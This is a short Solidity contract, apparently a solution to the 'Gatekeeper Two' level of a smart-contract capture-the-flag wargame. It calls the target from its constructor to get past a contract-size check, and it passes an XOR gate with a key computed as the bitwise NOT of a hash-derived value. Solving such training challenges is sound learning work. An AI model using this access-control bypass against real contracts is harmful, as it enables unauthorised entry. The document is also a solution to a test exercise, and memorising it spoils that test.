// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @dev Add everything in the contructor so the gate2 will not revert then calculate the base number computed by
/// gate 3 then apply a not byte opperator on it so the xor of both give the max number
contract HackGatekeeperTwo {
    constructor(address gatekeeperTwo) {
        uint64 base = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 key = ~base; // the not operator will give us the mask to have the full uint64 with a xor!
        (bool success,) = gatekeeperTwo.call(abi.encodeWithSignature("enter(bytes8)", bytes8(key)));
        require(success);
    }
}